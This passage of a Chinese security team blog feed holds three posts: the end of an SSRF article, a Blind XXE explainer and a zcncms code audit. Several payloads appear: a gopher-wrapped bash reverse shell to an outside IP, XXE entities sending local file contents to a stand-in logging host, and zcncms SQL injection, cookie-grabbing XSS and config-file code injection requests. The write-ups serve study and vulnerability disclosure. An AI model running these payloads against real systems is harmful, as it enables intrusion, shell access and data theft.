<p>因此针对应用二次挖掘的时候，在discuz、weblogic、sql连接器、xml执行器等等位置都可能存在这个漏洞。存在漏洞点对协议的支持也和是否能利用有很大关系，比如http get/put;webdav put;file;ftp/smtp/pop2;dict等等。<br>是否能够回显同样也是利用的重要因素，比如上面代码可以直接获取结果的完全回显，或者是只会返回成功失败的布尔回显以及甚至无回显。前段时间看到百度对自家ssrf的漏洞危险等级就是用回显程度来定义的。<br>如果漏洞存在点支持gopher协议可以直接用来进行文件操作getshell（参考gopher在xxe中的使用）。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:80/_POST /exp.php HTTP/1.1%0d%0aHost: 127.0.0.1%0d%0aUser-Agent: curl/7.43.0%0d%0aAccept: */*%0d%0aContent-Length: 49%0d%0aContent-Type: application/x-www-form-urlencoded%0d%0a%0d%0ae=bash -i &#62;%2526 /dev/tcp/172.19.23.228/2333 0&#62;%25261null</span><br></pre></td></tr></table></figure></p>
<p>所以简单来说，这个漏洞本身在很多地方都不被定义为漏洞。这个漏洞相当于一个起手式，比如一个布尔回显不支持gopher等协议的ssrf点，如果没有后招，则只能做一个内网拓扑，杀伤力很小。如果配合打出组合技则能打出意想不到的巨大杀伤，比如内网恰巧有一台未授权的redis。</p>
<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>在参考链接中给出一些我觉得这个漏洞利用比较经典的例子，更多的巧妙使用协议、巧妙组合其他利用就不再贴图了，抛砖引玉，有兴趣的少年可以进一步找出更多有趣的利用，脑洞有多大，漏洞能量就有多大。<br>最近的cve vBulletin rec中ssrf的利用就非常的经典。</p>
<p>参考链接<br><a href="http://drops.wooyun.org/papers/8261" target="_blank" rel="external">http://drops.wooyun.org/papers/8261</a><br><a href="http://drops.wooyun.org/web/7550" target="_blank" rel="external">http://drops.wooyun.org/web/7550</a><br><a href="http://www.wooyun.org/bugs/wooyun-2010-0213982" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-0213982</a><br><a href="http://www.wooyun.org/bugs/wooyun-2010-0214429" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-0214429</a><br><a href="http://www.freebuf.com/articles/web/20407.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/20407.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://dassec.b0.upaiyun.com/ksss/ssrf-1.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;很早就看到别人对这个漏洞的研究，但是完全没有预想到它能有这么大的能量。&lt;br&gt;
    
    </summary>
    
    
      <category term="SSRF" scheme="http://das.scusec.org/tags/SSRF/"/>
    
      <category term="gopher" scheme="http://das.scusec.org/tags/gopher/"/>
    
      <category term="ksss" scheme="http://das.scusec.org/tags/ksss/"/>
    
  </entry>
  
  <entry>
    <title>当提起Blind XXE时候会想到什么</title>
    <link href="http://das.scusec.org/2016/08/24/blind-xxe/"/>
    <id>http://das.scusec.org/2016/08/24/blind-xxe/</id>
    <published>2016-08-23T16:00:00.000Z</published>
    <updated>2016-08-24T12:09:17.738Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://dassec.b0.upaiyun.com/ksss/XXEA.png" alt=""></p>
<p>XXE（XML实体注入漏洞）顾名思义，漏洞的关键点在于服务器对外部实体的解析。外部实体中可以请求他域资源，也许在包括我之内的很多人在漏洞利用时会习惯的把XXE问题转换成SSRF的问题。<br><a id="more"></a></p>
<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>前几天别人问我一个有趣的问题：<strong>Blind XXE和普通XXE本质区别是什么。</strong> 仔细想了想，我答不上来，由于类似于cloudeye的使用DNS泛析和URL请求记录是可以查看命令执行结果的，大家通常不会在意漏洞点程序是否预设了回显或者可以使用报错得到回显。所以找了一些资料，记录一下上面问题的答案和也顺便记录一下XXE漏洞形成的原因。</p>
<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>首先要搞清楚的是XML外部实体的概念。一般容易误以为外部是自己定义的意思，事实上外部实体是指实体的参数内容不是当前XML定义的而是从其他资源引入的，用<strong>SYSTEM</strong>和<strong>PUBLIC</strong>来申明，也就是我们常在XXE payload里面看到的样子。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;!DOCTYPE ANY [&#10;&#10;&#60;!ENTITY hello SYSTEM &#34;http://%xx.xxx.yourcloudeye.xxx/%xx&#34;&#62;&#10;&#10;]&#62;</span><br></pre></td></tr></table></figure></p>
<p>如果在外界可控的 web代码和xml的交互点 可以插入我们定义的xml实体并被服务器解析，这样就造成了一个XXE漏洞（这句话写了很多遍还是觉得难读通顺，用SQLi类推一下就比较好理解了）。以php为例搭了一个测试环境。</p>
<p><img src="http://www.mauu.me/wp-content/uploads/2016/08/QQ%E6%88%AA%E5%9B%BE20160824092818.png" alt="enter description here"></p>
<p>首先浏览器是可以解析XML的，当然，是没有权限解析外部实体的（不然url链接没人敢点了）。开始在lamp下搭发现的www用户解析外部实体权限也不够，于是在wamp环境给apache sa权限测试。下面是php使用simplexml_load_file解析xml文件代码。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (file_exists(<span class="string">'b.xml'</span>)) &#123;</span><br><span class="line">    <span class="variable">$xml</span> = simplexml_load_file(<span class="string">'b.xml'</span>);</span><br><span class="line">    var_dump(<span class="variable">$xml</span>);</span><br><span class="line">    <span class="comment">/*echo($xml-&gt;title);*/</span></span><br><span class="line">    <span class="comment">/*var_dump($xml);*/</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">'Failed to open b.xml.'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="http://www.mauu.me/wp-content/uploads/2016/08/QQ%E6%88%AA%E5%9B%BE20160824094116.png" alt="enter description here"></p>
<p>xxetest.php把b.xml的内容解析后输出一个SimpleXMLElement对象，供其他函数使用xml中各个节点的值。我们可以在平台上看到解析外部实体发送的请求。剩下的利用就比较直观了，在请求资源时使用<a href="http://端口探测或带上内网攻击向量；file://或者php://filter等读取文件；gopher://发送复杂请求等等。" target="_blank" rel="external">http://端口探测或带上内网攻击向量；file://或者php://filter等读取文件；gopher://发送复杂请求等等。</a></p>
<p><img src="http://www.mauu.me/wp-content/uploads/2016/08/QQ%E6%88%AA%E5%9B%BE20160824094812.png" alt="enter description here"></p>
<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>回到Blind XXE的问题，仔细看b.xml可以发现，在开始定义了hello这个实体后，节点中引入了一个 <strong>&amp;hello；</strong>。如果请求的资源存在，则可以在节点中看到hello的值，这就是有返回的XXE雏形。对b.xml稍作修改，使用file协议读取本地文件，结果如下图。</p>
<p><img src="http://www.mauu.me/wp-content/uploads/2016/08/QQ%E6%88%AA%E5%9B%BE20160824100258.png" alt="enter description here"></p>
<p>所以如果xml文件没有在节点中使用这个实体，或者节点中使用了&amp;hello；而可执行文件没有把值在response中返回的情况就属于Blind XXE。<br>如果进行端口探测等操作可以直接参考SSRF利用时间差来完成，如果要接收回显的话，也可以用实体嵌套来完成。如果xml解析器不支持嵌套定义有可以把gethello内容写在外部xml中再引用进来有时候可以绕过。<br>也有把hello的值作为参数传给自己服务器上的php中然后保存成文件的，原理差不多，但是没有DNS解析平台简洁直观。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;!DOCTYPE root [  &#10;&#60;!ENTITY % hello &#34;file:///c:/1.txt&#34;&#62;  &#10;&#60;!ENTITY % gethello &#34;&#60;!ENTITY % param222 SYSTEM&#39;http://xxx.yourcloudeye.xxx/%hello;&#39;&#62;&#34;&#62;  &#10;%gethello;  &#10;]&#62;</span><br></pre></td></tr></table></figure></p>
<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>对XXE的总结就差不多到这里了，如果说Blind XXE和XXE有什么本质区别的话，大概是Blind会让有些人说的：“不就是发包看返回的”的扫描器比较头疼吧。<br>之前SSRF文章的坑也准备填上了，2准备把归纳的一些gopher构造方法，一些内网ip限制绕过策略，以及打造自己的SSRF自动化探测脚本三个方面总结一下。<br>最近发现自己关于程序底层和程序优化相关的比较弱，想学习一下，有好的资料请推荐给我嘛~~</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://dassec.b0.upaiyun.com/ksss/XXEA.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;XXE（XML实体注入漏洞）顾名思义，漏洞的关键点在于服务器对外部实体的解析。外部实体中可以请求他域资源，也许在包括我之内的很多人在漏洞利用时会习惯的把XXE问题转换成SSRF的问题。&lt;br&gt;
    
    </summary>
    
      <category term="安全笔记" scheme="http://das.scusec.org/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="blind XXE" scheme="http://das.scusec.org/tags/blind-XXE/"/>
    
      <category term="ksss" scheme="http://das.scusec.org/tags/ksss/"/>
    
      <category term="实体注入" scheme="http://das.scusec.org/tags/%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>代码审计——zcncms几处漏洞合集(二)</title>
    <link href="http://das.scusec.org/2016/08/23/code-audit-of-zcncms2/"/>
    <id>http://das.scusec.org/2016/08/23/code-audit-of-zcncms2/</id>
    <published>2016-08-22T16:00:00.000Z</published>
    <updated>2016-08-25T09:08:49.954Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://dassec.b0.upaiyun.com/wps2015/zcncms-bugs.jpg" alt=""></p>
<p>接上一篇 <a href="http://wps2015.org/2016/08/05/code%20audit%20of%20zcncms/" target="_blank" rel="external">代码审计——zcncms后台SQL注入(一)</a>， 继续挖掘出zcncms的几处漏洞.<br><a id="more"></a></p>
<h2 id="0x00-后台SQL注入"><a href="#0x00-后台SQL注入" class="headerlink" title="0x00 后台SQL注入"></a>0x00 后台SQL注入</h2><p>继上一篇参数$parentid未正确处理后，在/module/products/admincontroller/products_photo.php中，<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(<span class="variable">$a</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'list'</span>:<span class="keyword">default</span>:<span class="comment">//list</span></span><br><span class="line">		<span class="comment">//列表</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$productid</span>)) &#123;</span><br><span class="line">			<span class="variable">$where</span> = <span class="string">' 1 = 1 '</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="variable">$where</span> = <span class="string">" productid = '"</span>.<span class="variable">$productid</span>.<span class="string">"' "</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$pageListNum</span>=<span class="number">12</span>;<span class="comment">//每页显示</span></span><br><span class="line">		<span class="variable">$totalPage</span>=<span class="number">0</span>;<span class="comment">//总页数</span></span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line"><span class="keyword">case</span> <span class="string">'edit'</span>:<span class="comment">//</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$submit</span>))&#123;</span><br><span class="line">			<span class="variable">$info</span> = <span class="keyword">array</span>();</span><br><span class="line">			<span class="variable">$time</span> = time();</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$id</span>))&#123;</span><br><span class="line">				<span class="variable">$id</span> = intval(<span class="variable">$id</span>);</span><br><span class="line">				<span class="keyword">if</span>(<span class="variable">$id</span> &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">					errorinfo(<span class="string">'变量错误'</span>,<span class="string">''</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="variable">$infoold</span> = <span class="variable">$products_photo</span>-&gt;GetInfo(<span class="string">''</span>,<span class="string">' id = '</span>.<span class="variable">$id</span>);				</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="variable">$productinfo</span> = <span class="variable">$products</span>-&gt;GetInfo(<span class="string">''</span>,<span class="string">' id = '</span>.<span class="variable">$productid</span>);</span><br><span class="line">			<span class="comment">//20120719</span></span><br><span class="line">			checkClassPower(<span class="string">'products'</span>,<span class="variable">$productinfo</span>[<span class="string">'classid'</span>]);</span><br></pre></td></tr></table></figure></p>
<p>当 $a的值为’list’时，<code>$where = &quot; productid = &#39;&quot;.$productid.&quot;&#39; &quot;</code>, $procuctid被单引号保护起来，参数引进是经过addslashes操作的，所以这里是安全的。但是当$a == ‘edit’时，<code>$products-&gt;GetInfo(&#39;&#39;,&#39; id = &#39;.$productid)</code>，$productid被直接拼接到where语句中且没有单引号保护，导致SQL注入。构造payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8088/code_audit/zcncms/admin/?c=products_photo&#38;a=edit&#38;id=7&#10;POST:&#10;submit=&#38;productid=12=@`\\\&#39;`  and 1=(updatexml(1,concat(0x5e24,(select user()),0x5e24),1));#@`\\\&#39;`</span><br></pre></td></tr></table></figure></p>
<p><img src="https://img.alicdn.com/imgextra/i1/792076116/TB2xsvmuXXXXXcTXpXXXXXXXXXX_!!792076116.png" alt=""></p>
<h2 id="0x01-反射型xss"><a href="#0x01-反射型xss" class="headerlink" title="0x01 反射型xss"></a>0x01 反射型xss</h2><p>在后台登陆文件 /include/admincontroller/login.php中，进行登陆是否成功后，设置模板文件为’login.tpl.php’.<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">header(<span class="string">"location:./"</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//echo 1;</span></span><br><span class="line"><span class="variable">$loginerror</span> = <span class="string">'用户名密码错误，请重新登陆.'</span>;</span><br><span class="line"><span class="variable">$templatefile</span> = <span class="string">'login.tpl.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$templatefile</span> = <span class="string">'login.tpl.php'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>跟踪到/admin/templates/default/login.tpl.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;</span><br><span class="line"><span class="preprocessor">&lt;?php</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$topTitle</span>)) <span class="keyword">echo</span> <span class="variable">$topTitle</span>.<span class="string">'-'</span>;<span class="preprocessor">?&gt;</span></span><br><span class="line"><span class="preprocessor">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$sys</span>[<span class="string">'indextitle'</span>]; <span class="preprocessor">?&gt;</span>-<span class="preprocessor">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$pagetitle</span>;<span class="preprocessor">?&gt;</span>&lt;/title&gt;</span><br><span class="line">&lt;meta name=<span class="string">"keywords"</span> content=<span class="string">"&lt;?php echo $sys['webkeywords']; ?&gt;"</span>&gt;</span><br><span class="line">&lt;meta name=<span class="string">"description"</span> content=<span class="string">"&lt;?php echo $sys['webdescription']; ?&gt;"</span>&gt;</span><br></pre></td></tr></table></figure></p>
<p>在<code>&lt;title&gt;</code>标签中要echo三个变量，其中会检查$topTitle是否为空，我们再控制器文件login.php中并未找到$topTitle的定义或初始化，由于之前参数输入特性，可以进行变量覆盖。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8088/code_audit/zcncms/admin/?c=login&#38;topTitle=&#60;/title&#62;&#60;script&#62;alert(document.cookie)&#60;/script&#62;</span><br></pre></td></tr></table></figure>
<p><img src="https://img.alicdn.com/imgextra/i2/792076116/TB2ufnWuXXXXXbmXXXXXXXXXXXX_!!792076116.png" alt=""></p>
<h2 id="0x02-后台getshell"><a href="#0x02-后台getshell" class="headerlink" title="0x02 后台getshell"></a>0x02 后台getshell</h2><p>在文件/include/admincontroller/sys.php中<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pagetitle</span> = <span class="string">'基本信息'</span>;</span><br><span class="line"><span class="variable">$pagepower</span> = <span class="string">'sys'</span>;</span><br><span class="line"><span class="comment">//基本部分</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'checkpower.inc.php'</span>);</span><br><span class="line"><span class="comment">//功能部分</span></span><br><span class="line"><span class="keyword">include_once</span>(WEB_INC.<span class="string">'file.class.php'</span>);</span><br><span class="line"><span class="keyword">include_once</span>(WEB_INC.<span class="string">'string.class.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$submit</span>))&#123;</span><br><span class="line">	<span class="variable">$FS</span> = <span class="keyword">new</span> files();</span><br><span class="line">	<span class="variable">$STR</span> = <span class="keyword">new</span> C_STRING();</span><br><span class="line">	<span class="variable">$info</span> = <span class="keyword">array</span>(</span><br><span class="line">	<span class="string">'isclose'</span> =&gt; <span class="variable">$isclose</span>,</span><br><span class="line">	<span class="string">'closeinfo'</span> =&gt; <span class="variable">$closeinfo</span>,</span><br><span class="line">	<span class="string">'webtitle'</span> =&gt; <span class="variable">$webtitle</span>,</span><br><span class="line">	<span class="string">'indextitle'</span> =&gt; <span class="variable">$indextitle</span>,</span><br><span class="line">	<span class="string">'webkeywords'</span> =&gt; <span class="variable">$webkeywords</span>,</span><br><span class="line">	<span class="string">'webdescription'</span> =&gt; <span class="variable">$webdescription</span>,</span><br><span class="line">	<span class="string">'webcopyright'</span> =&gt; <span class="variable">$webcopyright</span>,</span><br><span class="line">	<span class="string">'webbeian'</span> =&gt; <span class="variable">$webbeian</span>,</span><br><span class="line">	<span class="string">'systemplates'</span> =&gt; <span class="variable">$systemplates</span>,</span><br><span class="line">	<span class="string">'linkurlmode'</span> =&gt; <span class="variable">$linkurlmode</span>,</span><br><span class="line">	);</span><br><span class="line">	<span class="variable">$rs_msg</span> = <span class="variable">$STR</span>-&gt;safe(<span class="variable">$info</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$FS</span>-&gt;file_Write(<span class="variable">$rs_msg</span>, WEB_INC.<span class="string">'sys.inc.php'</span>, <span class="string">'sys'</span>)) &#123;</span><br><span class="line">		errorInfo(<span class="string">'编辑成功'</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		errorInfo();</span><br></pre></td></tr></table></figure></p>
<p>可编辑网站的基本信息并且存入sys.inc.php，<code>$rs_msg = $STR-&gt;safe($info);</code>但是$info经过了safe函数，我们跟踪safe函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">(<span class="variable">$msg</span>)</span></span><br><span class="line">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="variable">$msg</span> &amp;&amp; <span class="variable">$msg</span> != <span class="string">'0'</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(is_array(<span class="variable">$msg</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">foreach</span>(<span class="variable">$msg</span> <span class="keyword">AS</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="variable">$msg</span>[<span class="variable">$key</span>] = <span class="variable">$this</span>-&gt;safe(<span class="variable">$value</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$msg</span> = trim(<span class="variable">$msg</span>);</span><br><span class="line">			<span class="comment">//$old = array("&amp;amp;","&amp;nbsp;","'",'"',"\t","\r");</span></span><br><span class="line">			<span class="comment">//$new = array("&amp;"," ","&amp;#39;","&amp;quot;","&amp;nbsp; &amp;nbsp; ","");</span></span><br><span class="line">			<span class="variable">$old</span> = <span class="keyword">array</span>(<span class="string">"&amp;amp;"</span>,<span class="string">"&amp;nbsp;"</span>,<span class="string">"'"</span>,<span class="string">'"'</span>,<span class="string">"\t"</span>);</span><br><span class="line">			<span class="variable">$new</span> = <span class="keyword">array</span>(<span class="string">"&amp;"</span>,<span class="string">" "</span>,<span class="string">"&amp;#39;"</span>,<span class="string">"&amp;quot;"</span>,<span class="string">"&amp;nbsp; &amp;nbsp; "</span>);</span><br><span class="line">			<span class="variable">$msg</span> = str_replace(<span class="variable">$old</span>,<span class="variable">$new</span>,<span class="variable">$msg</span>);</span><br><span class="line">			<span class="variable">$msg</span> = str_replace(<span class="string">"   "</span>,<span class="string">"&amp;nbsp; &amp;nbsp;"</span>,<span class="variable">$msg</span>);</span><br><span class="line">			<span class="variable">$old</span> = <span class="keyword">array</span>(<span class="string">"/&lt;script(.*)&lt;\/script&gt;/isU"</span>,<span class="string">"/&lt;frame(.*)&gt;/isU"</span>,<span class="string">"/&lt;\/fram(.*)&gt;/isU"</span>,<span class="string">"/&lt;iframe(.*)&gt;/isU"</span>,<span class="string">"/&lt;\/ifram(.*)&gt;/isU"</span>,<span class="string">"/&lt;style(.*)&lt;\/style&gt;/isU"</span>);</span><br><span class="line">			<span class="variable">$new</span> = <span class="keyword">array</span>(<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>);</span><br><span class="line">			<span class="variable">$msg</span> = preg_replace(<span class="variable">$old</span>,<span class="variable">$new</span>,<span class="variable">$msg</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$msg</span>;</span><br></pre></td></tr></table></figure></p>
<p>safe函数过滤了单双引号及常见的xss，我们再看看sys.inc.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="variable">$sys</span>[<span class="string">"isclose"</span>] = <span class="string">'0'</span>;</span><br><span class="line"><span class="variable">$sys</span>[<span class="string">"closeinfo"</span>] = <span class="string">'comming soon'</span>;</span><br><span class="line"><span class="variable">$sys</span>[<span class="string">"webtitle"</span>] = <span class="string">'ZCNCMS'</span>;</span><br><span class="line"><span class="variable">$sys</span>[<span class="string">"indextitle"</span>] = <span class="string">'ZCNCMS专注内容'</span>;</span><br><span class="line"><span class="variable">$sys</span>[<span class="string">"webkeywords"</span>] = <span class="string">'ZCNCMS专注内容'</span>;</span><br><span class="line"><span class="variable">$sys</span>[<span class="string">"webdescription"</span>] = <span class="string">'ZCNCMS专注内容'</span>;</span><br><span class="line"><span class="variable">$sys</span>[<span class="string">"webcopyright"</span>] = <span class="string">'Copyright+©+1996-2012,+All+Rights+Reserved+ZCNCMS'</span>;</span><br><span class="line"><span class="variable">$sys</span>[<span class="string">"webbeian"</span>] = <span class="string">'ZCNCMS专注内容'</span>;</span><br><span class="line"><span class="variable">$sys</span>[<span class="string">"systemplates"</span>] = <span class="string">'default'</span>;</span><br><span class="line"><span class="variable">$sys</span>[<span class="string">"linkurlmode"</span>] = <span class="string">'0'</span>;</span><br><span class="line"></span><br><span class="line"> <span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>我们继续跟踪sys.php中的写函数，<code>file_Write()-&gt;_write()</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//写入信息</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">_write</span><span class="params">(<span class="variable">$content</span>,<span class="variable">$file</span>,<span class="variable">$type</span>=<span class="string">"wb"</span>)</span></span><br><span class="line">	</span>&#123;</span><br><span class="line">		<span class="keyword">global</span> <span class="variable">$system_time</span>;</span><br><span class="line">		<span class="variable">$content</span> = stripslashes(<span class="variable">$content</span>);</span><br><span class="line">		<span class="variable">$handle</span> = <span class="variable">$this</span>-&gt;_open(<span class="variable">$file</span>,<span class="variable">$type</span>);</span><br><span class="line">		@fwrite(<span class="variable">$handle</span>,<span class="variable">$content</span>);</span><br><span class="line">		<span class="keyword">unset</span>(<span class="variable">$content</span>);</span><br><span class="line">		<span class="variable">$this</span>-&gt;close(<span class="variable">$handle</span>);</span><br><span class="line">		<span class="comment">//设置文件创建的时间</span></span><br><span class="line">		<span class="variable">$system_time</span> = <span class="variable">$system_time</span> ? <span class="variable">$system_time</span> : time();</span><br><span class="line">		@touch(<span class="variable">$file</span>,<span class="variable">$system_time</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>发现经过一系列的安全处理后，写入前会进行stripslashes操作,但是之前单引号被替换了。这里想到了<code>\</code><br>我们呢可以这样构造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8088/code_audit/zcncms/admin/?c=sys&#10;POST:&#10;isclose=0&#38;closeinfo=1\&#38;webtitle=;phpinfo();//&#38;indextitle=ZCNCMS%E4%B8%93%E6%B3%A8%E5%86%85%E5%AE%B9&#38;webkeywords=ZCNCMS%E4%B8%93%E6%B3%A8%E5%86%85%E5%AE%B9&#38;webdescription=ZCNCMS%E4%B8%93%E6%B3%A8%E5%86%85%E5%AE%B9&#38;webbeian=ZCNCMS%E4%B8%93%E6%B3%A8%E5%86%85%E5%AE%B9&#38;webcopyright=Copyright+%C2%A9+1996-2012%2C+All+Rights+Reserved+ZCNCMS&#38;linkurlmode=0&#38;systemplates=default&#38;submit=%E7%BC%96%E8%BE%91</span><br></pre></td></tr></table></figure></p>
